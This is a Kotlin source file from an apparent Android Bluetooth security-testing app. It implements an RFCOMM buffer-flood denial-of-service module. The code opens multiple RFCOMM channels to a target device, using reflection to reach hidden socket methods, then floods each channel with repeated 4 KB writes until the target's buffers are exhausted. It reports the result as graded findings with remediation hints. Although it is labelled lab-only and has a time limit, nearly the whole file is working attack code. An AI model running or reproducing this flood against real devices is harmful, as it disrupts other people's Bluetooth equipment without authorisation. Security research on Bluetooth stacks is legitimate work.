package com.bluetoothseclab.attacks

import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import com.bluetoothseclab.models.AttackResult
import java.io.OutputStream
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * RFCOMM Buffer Flood DoS.
 *
 * Research pattern: opens RFCOMM connections and floods with large payloads
 * to exhaust the target's RFCOMM buffer space. Legacy Bluetooth stacks
 * have limited buffer allocation per RFCOMM channel.
 *
 * Similar to techniques described in Bluetooth SIG security advisories
 * regarding RFCOMM resource exhaustion on constrained devices.
 *
 * No root required — uses standard Android BluetoothSocket API.
 *
 * Lab-only use. Auto-stops after MAX_DURATION_MS.
 */
object RfcommBufferFlood {

    private const val TAG = "RfcommBufFlood"
    private const val MAX_CHANNELS = 10
    private const val FLOOD_ITERATIONS = 20
    private const val PAYLOAD_SIZE = 4096
    private const val MAX_DURATION_MS = 25_000L
    private const val CONNECT_TIMEOUT_MS = 4000L
    private const val WRITE_DELAY_MS = 50L

    private val isRunning = AtomicBoolean(false)
    private val handler = Handler(Looper.getMainLooper())

    data class FloodResult(
        val channelsOpened: Int,
        val totalBytesSent: Long,
        val writeErrors: Int,
        val avgWriteTimeMs: Long,
        val buffersExhausted: Boolean
    )

    fun stop() {
        isRunning.set(false)
    }

    fun flood(
        device: BluetoothDevice,
        context: Context,
        onProgress: (String) -> Unit,
        onResult: (FloodResult) -> Unit,
        onComplete: (AttackResult) -> Unit
    ) {
        if (isRunning.getAndSet(true)) {
            handler.post { onComplete(
                AttackResult(
                    moduleName = "RFCOMM Buffer Flood",
                    status = AttackResult.Status.FAILED,
                    findings = listOf(AttackResult.Finding(
                        title = "Already Running",
                        description = "An RFCOMM flood test is already in progress",
                        severity = AttackResult.Severity.INFO
                    )),
                    summary = "Skipped — already running",
                    riskScore = 0f,
                    durationMs = 0
                )
            )}
            return
        }

        val startTime = System.currentTimeMillis()
        val bluetoothAdapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            isRunning.set(false)
            handler.post { onComplete(
                AttackResult(
                    moduleName = "RFCOMM Buffer Flood",
                    status = AttackResult.Status.FAILED,
                    findings = listOf(AttackResult.Finding(
                        title = "Bluetooth Off",
                        description = "Bluetooth adapter is not enabled",
                        severity = AttackResult.Severity.INFO
                    )),
                    summary = "Failed: Bluetooth disabled",
                    riskScore = 0f,
                    durationMs = 0
                )
            )}
            return
        }

        Thread {
            val openSockets = mutableListOf<BluetoothSocket>()
            var totalBytes = 0L
            var writeErrors = 0
            val writeTimes = mutableListOf<Long>()
            var buffersExhausted = false
            val channelsOpened = AtomicInteger(0)

            handler.postDelayed({ isRunning.set(false) }, MAX_DURATION_MS)

            try {
                handler.post { onProgress("[RFCOMM-FLOOD] Opening RFCOMM channels to ${device.address}...") }
                handler.post { onProgress("[RFCOMM-FLOOD] Max $MAX_CHANNELS channels, ${FLOOD_ITERATIONS} writes each") }

                // Phase 1: Open multiple RFCOMM connections
                for (channel in 1..MAX_CHANNELS) {
                    if (!isRunning.get()) break

                    handler.post { onProgress("[RFCOMM-FLOOD] Opening channel $channel/$MAX_CHANNELS...") }

                    var socket: BluetoothSocket? = null
                    var connected = false

                    // Try secure first, then insecure
                    try {
                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
                            val createMethod = try {
                                device.javaClass.getDeclaredMethod("createRfcommSocket", Int::class.java)
                            } catch (_: NoSuchMethodException) {
                                device.javaClass.getDeclaredMethod("createInsecureRfcommSocket", Int::class.java)
                            }
                            createMethod.isAccessible = true
                            socket = createMethod.invoke(device, channel) as BluetoothSocket
                        } else {
                            socket = device.createRfcommSocketToServiceRecord(
                                java.util.UUID.fromString("00001101-0000-1000-8000-00805f9b34fb")
                            )
                        }
                        socket?.connect()
                        connected = true
                        channelsOpened.incrementAndGet()
                        openSockets.add(socket!!)
                        handler.post { onProgress("[RFCOMM-FLOOD] ✓ Channel $channel open") }
                    } catch (_: Exception) {
                        connected = false
                        try { socket?.close() } catch (_: Exception) {}
                    }

                    // If first channel fails, try SPP UUID
                    if (!connected && channel == 1) {
                        try {
                            val sppUuid = java.util.UUID.fromString("00001101-0000-1000-8000-00805f9b34fb")
                            socket = device.createRfcommSocketToServiceRecord(sppUuid)
                            socket.connect()
                            connected = true
                            channelsOpened.incrementAndGet()
                            openSockets.add(socket)
                            handler.post { onProgress("[RFCOMM-FLOOD] ✓ SPP channel open") }
                        } catch (_: Exception) {
                            try { socket?.close() } catch (_: Exception) {}
                        }
                    }

                    Thread.sleep(200)
                }

                if (openSockets.isEmpty()) {
                    isRunning.set(false)
                    handler.post { onComplete(
                        AttackResult(
                            moduleName = "RFCOMM Buffer Flood",
                            status = AttackResult.Status.PARTIAL,
                            findings = listOf(AttackResult.Finding(
                                title = "No RFCOMM Channels Opened",
                                description = "Could not open any RFCOMM channels to the target. " +
                                    "Device may require authentication or not expose RFCOMM services.",
                                severity = AttackResult.Severity.MEDIUM
                            )),
                            summary = "No channels opened — target may not expose RFCOMM",
                            riskScore = 2.0f,
                            durationMs = System.currentTimeMillis() - startTime
                        )
                    )}
                    return@Thread
                }

                val numChannels = openSockets.size
                handler.post { onProgress("[RFCOMM-FLOOD] $numChannels channels open. Starting buffer flood...") }

                // Phase 2: Flood each channel with large payloads
                val floodPayload = ByteArray(PAYLOAD_SIZE) { (it % 256).toByte() }

                for (iter in 1..FLOOD_ITERATIONS) {
                    if (!isRunning.get()) break

                    handler.post { onProgress("[RFCOMM-FLOOD] Flood iteration $iter/$FLOOD_ITERATIONS...") }

                    for ((idx, socket) in openSockets.withIndex()) {
                        if (!isRunning.get()) break
                        try {
                            val os: OutputStream = socket.outputStream
                            val writeStart = System.currentTimeMillis()
                            os.write(floodPayload)
                            os.flush()
                            val writeElapsed = System.currentTimeMillis() - writeStart
                            synchronized(writeTimes) { writeTimes.add(writeElapsed) }
                            totalBytes += PAYLOAD_SIZE
                        } catch (e: Exception) {
                            writeErrors++
                            if (writeErrors > numChannels * 3) {
                                // Too many errors = buffers likely exhausted
                                buffersExhausted = true
                                handler.post { onProgress("[RFCOMM-FLOOD] Buffer exhaustion detected at iteration $iter") }
                                break
                            }
                        }
                        Thread.sleep(WRITE_DELAY_MS)
                    }

                    handler.post {
                        onProgress("[RFCOMM-FLOOD] Iter $iter: ${totalBytes / 1024}KB sent, $writeErrors errors")
                    }
                }

                val avgWriteTime = if (writeTimes.isNotEmpty()) writeTimes.average().toLong() else 0L

                val result = FloodResult(
                    channelsOpened = channelsOpened.get(),
                    totalBytesSent = totalBytes,
                    writeErrors = writeErrors,
                    avgWriteTimeMs = avgWriteTime,
                    buffersExhausted = buffersExhausted
                )

                handler.post { onResult(result) }

                val findings = mutableListOf<AttackResult.Finding>()

                if (buffersExhausted) {
                    findings.add(AttackResult.Finding(
                        title = "RFCOMM Buffer Exhaustion Detected",
                        description = "Write errors increased dramatically after ${totalBytes / 1024}KB sent. " +
                            "This indicates the target's RFCOMM buffers are exhausted. " +
                            "Legacy stacks (e.g. Parani M10, older IoT) are especially vulnerable.",
                        severity = AttackResult.Severity.CRITICAL,
                        cveReference = "RFCOMM resource exhaustion pattern (no assigned CVE)",
                        remediation = "Upgrade Bluetooth stack, implement per-channel rate limiting"
                    ))
                }

                findings.add(AttackResult.Finding(
                    title = "RFCOMM Flood Results",
                    description = "Channels opened: ${channelsOpened.get()}, " +
                        "Total sent: ${totalBytes / 1024}KB, " +
                        "Write errors: $writeErrors, " +
                        "Avg write time: ${avgWriteTime}ms",
                    severity = if (writeErrors > 5) AttackResult.Severity.HIGH else AttackResult.Severity.MEDIUM
                ))

                if (channelsOpened.get() >= 3) {
                    findings.add(AttackResult.Finding(
                        title = "Multiple RFCOMM Channels Exposed",
                        description = "Target accepted ${channelsOpened.get()} simultaneous RFCOMM connections. " +
                            "Each channel can be flooded independently to amplify the DoS effect.",
                        severity = AttackResult.Severity.HIGH,
                        remediation = "Limit concurrent RFCOMM connections, require authentication"
                    ))
                }

                val elapsed = System.currentTimeMillis() - startTime
                handler.post {
                    onComplete(
                        AttackResult(
                            moduleName = "RFCOMM Buffer Flood",
                            status = if (buffersExhausted) AttackResult.Status.SUCCESS else AttackResult.Status.PARTIAL,
                            findings = findings,
                            summary = "RFCOMM flood: ${channelsOpened.get()} channels, ${totalBytes / 1024}KB sent" +
                                if (buffersExhausted) " — BUFFERS EXHAUSTED" else "",
                            riskScore = if (buffersExhausted) 9.0f else if (writeErrors > 3) 6.0f else 3.0f,
                            durationMs = elapsed
                        )
                    )
                }

            } catch (e: Exception) {
                val elapsed = System.currentTimeMillis() - startTime
                handler.post {
                    onComplete(
                        AttackResult(
                            moduleName = "RFCOMM Buffer Flood",
                            status = AttackResult.Status.FAILED,
                            findings = listOf(AttackResult.Finding(
                                title = "Flood Error",
                                description = e.message ?: "Unknown error",
                                severity = AttackResult.Severity.INFO
                            )),
                            summary = "RFCOMM flood failed: ${e.message}",
                            riskScore = 0f,
                            durationMs = elapsed
                        )
                    )
                }
            } finally {
                for (socket in openSockets) {
                    try { socket.close() } catch (_: Exception) {}
                }
                isRunning.set(false)
            }
        }.start()
    }
}
